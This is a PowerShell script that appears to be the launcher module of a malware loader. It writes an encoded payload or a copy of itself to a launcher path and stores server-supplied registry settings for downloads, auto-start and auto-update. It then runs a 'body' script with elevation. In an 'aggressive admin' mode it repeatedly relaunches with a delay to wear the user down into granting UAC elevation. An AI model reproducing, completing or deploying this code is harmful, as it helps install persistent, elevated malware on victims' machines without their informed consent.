. ./utils.ps1
. ./consts_body.ps1

$globalScriptPaths = @(
    #$MyInvocation.MyCommand.Definition,
    $PSCommandPath,
    $MyInvocation.MyCommand.Path
)

function Get-ScriptPath {
    
    foreach ($path in $globalScriptPaths) {
        try {
            if (Test-Path $path) {
                return $path
            }
        }
        catch {
        }
    }
}

function extract_launcher()
{
    try
    {
        

        $launcherFile = Get-LauncherPath
        if ([string]::IsNullOrEmpty($EncodedScript) -eq $false)
        {
            $random = '###random'
            $content = '
    ###dynamic
    '
            $DoubleQuote = [char]34
            $DollarSign = [char]36
            $sb = New-Object System.Text.StringBuilder
            [void]$sb.AppendLine($random)
            [void]$sb.Append($DollarSign)
            [void]$sb.Append("EncodedScript =")
            [void]$sb.Append($DoubleQuote)
            [void]$sb.Append($EncodedScript)
            [void]$sb.Append($DoubleQuote)
            [void]$sb.AppendLine("")
            [void]$sb.AppendLine($content)
            $content = $sb.ToString()
            $folderPath = [System.IO.Path]::GetDirectoryName($launcherFile)
            if (-not (Test-Path -Path $folderPath)) {
                New-Item -Path $folderPath -ItemType Directory
            }
            [System.IO.File]::WriteAllText($launcherFile, $content)
            writedbg "extract_launcher encodedScript"

            return
        }
        try
        {
            $curScript = Get-ScriptPath
            $pathOrData = $global:MyInvocation.MyCommand.Definition
            if ($pathOrData.Length -gt 500)
            {
                writedbg "extract_launcher pathOrData"
                [System.IO.File]::WriteAllText($launcherFile, $pathOrData)
            } 
            else 
            {
                if ($curScript -ne $launcherFile)
                {
                    Copy-Item -Path $curScript -Destination $launcherFile -Force
                }
            } 
        }
        catch
        {
        }
    }
    finally 
    {
        try 
        { 
            if ($null -ne $server.startDownloads) 
            {
                if ($null -ne $server.startDownloads[0]) 
                {
                    RegWriteParam -keyName "download" -value $server.startDownloads[0]    
                }
            }
            RegWriteParamBool -keyName "autoStart" -value $server.autoStart    
            RegWriteParamBool -keyName "autoUpdate" -value $server.autoUpdate
            RegWriteParam -keyName "trackSerie" -value $server.trackSerie
        }
        catch {
        
        }
    }
}

function do_autorun()
{
    extract_launcher
    $body = (Get-BodyPath)
    if ($server.aggressiveAdmin)
    {
        $elevated = IsElevated
        if ($elevated)
        {
            writedbg "running elevated body path in aggressive admin"
            RunMe -script $body  -repassArgs $false -argName "" -argValue "" -uac $true
        } 
        else 
        {
            $attempt = GetArgInt("attempt")
            $attempt = $attempt + 1
            if ($attempt -ne 1)
            {
                $sleep = $server.aggressiveAdminDelay
                writedbg "Not elevated, sleeping: $sleep"
                Start-Sleep -Seconds $sleep
            }
            writedbg "aggressive admin: one UAC to elevate body (no separate holder)"
            try {
                RunMe -script $body -repassArgs $false -argName "attempt" -argValue $attempt -uac $true
            }
            catch {
                writedbg "RunMe (elevate body) failed: $_"
            }
        }
    }
    else 
    {
        writedbg "No aggresive admin"
        try 
        {
            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $true
        }
        catch {
            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $false
        }
    }

}

do_autorun
